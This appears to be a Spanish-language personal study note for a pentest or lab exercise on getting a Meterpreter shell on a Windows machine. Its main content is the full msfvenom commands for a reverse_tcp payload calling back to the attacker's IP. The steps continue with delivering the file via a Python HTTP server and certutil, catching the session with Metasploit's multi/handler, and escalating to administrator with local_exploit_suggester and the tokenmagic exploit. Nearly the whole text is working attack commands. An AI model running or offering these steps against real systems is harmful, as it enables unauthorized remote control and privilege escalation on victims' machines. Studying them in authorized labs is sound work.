
#### LINUX & WINDOWS

El primer paso será obtener una sesión de merterpreter con la maquina Windows.
Creamos el payload.
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.28 LPORT=444 -f exe -o virus.exe`
En caso de que sea de 64 bits.
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.28 LPORT=444 -f exe -o virus.exe`

Levantamos un servidor en Python.
` python3 -m http.server 80`

En la maquina victima navegamos a la IP y descargamos el archivo.
`certutil -split -urlcache -f http://<IP-atacnte>/<nombre-archivo> <nombre-resultante>`

En la maquina atacante debemos de abrir [[METASPLOIT]]
usaremos MultiHandler para obtener la sesión de meterpreter.
`use exploit/multi/handler`
- Vemos las opciones de configuración.
	`show options`
- Ponemos la IP de la maquina atacante
	`set LHOST`
- Ponemos el puerto de escucha el mismo que en el payload de msfvenom
	`set LPORT`
- Y seleccionamos el payload que es el mismo que hemos usado en [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]]
	`set PAYLOAD`
Ejecutamos con `run`
Tenemos que ejecutar también el archivo en la maquina Windows.
Habremos obtenido una sesión de meterpreter.
Ponemos el meterpreter en segundo plano con el comando `background`

Podemos usar el comando `getsystem` para la escalada de privilegios o 

Automatizar la escalada de privilegios usaremos el siguiente exploit.
`search local_exploit_suggester`

Tenemos que configurar el SESSION, para saber el id de la sesión ejecutaremos el comando `sessions -l`

El id de sesión que tengamos lo cargamos en el exploit con `set SESSION`, y lo ejecutamos con el comando `run` 

Los exploits que son funcionales son los que salen en color verde, tendremos que probar con ellos cual es el que nos funciona en este caso usamos el siguiente.
`xploit/windows/local/tokenmagic`

Copiamos el nombre del exploit y ejecutamos.
`use exploit/windows/local/tokenmagic`
 Debemos ejecutar el comando `show options` e ir rellenando la información que nos pida
 `set SESSION`
 `set LHOST`
 `set LPORT 555`

Ejecutamos el comando `run` y nos hace automáticamente la escalada de privilegios, otorgándonos una sesión de meterpreter con el usuario administrador.


#### POST EXPLOTACION

Si nos preguntan cuantos usuarios hay dentro de la maquina en Windows podemos usar el comando.
`net users`

